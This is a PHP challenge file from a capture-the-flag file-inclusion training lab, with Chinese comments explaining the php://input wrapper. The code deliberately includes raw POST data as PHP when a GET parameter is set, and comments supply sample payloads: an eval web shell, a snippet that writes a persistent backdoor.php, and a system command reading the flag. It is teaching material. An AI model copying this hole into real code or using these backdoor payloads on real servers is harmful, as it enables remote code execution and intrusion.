<?php 
include("get_flag.php");
/*
# -*- coding: utf-8 -*-
# @Author: 探姬
# @Date:   2024-07-28 20:30
# @Repo:   github.com/ProbiusOfficial/PHPinclude-labs
# @email:  admin@hello-ctf.com
# @link:   hello-ctf.com

--- HelloCTF - 文件包含基础靶场 关卡 7 : php协议_php://input --- 

php://input - 可以访问请求的原始数据的只读流，在POST请求中访问POST的data部分，在enctype="multipart/form-data" 的时候php://input 是无效的。常用于执行代码。 依赖：allow_url_include:On

php://input做为include的直接参数时，如题，php执行时会将post内容当作文件内容，要注意，php://input不支持post提交，其请求的参数格式是原生(Raw)的内容，无法使用hackbar提交，因为hackbar不支持raw方式  

该关卡配置:
allow_url_fopen:On
allow_url_include:On

相关文件：
- 当前目录下 flag.php 文件，flag以静态变量形式存储在文件中。
- 根目录下 flag 文件，flag以文本形式存储在文件中。

*/

/* Try Raw: <?php eval($_GET['ctf']); ?> */
/* Or <?php fputs(fopen('backdoor.php','w'),'<?php eval($_POST["ctf"]); ?>'); ?> */
/* Or <\?= system('tac flag.???');?> 记得去掉转义 */

isset($_GET['wrappers']) ? include("php://input") : '';

highlight_file(__FILE__);

?>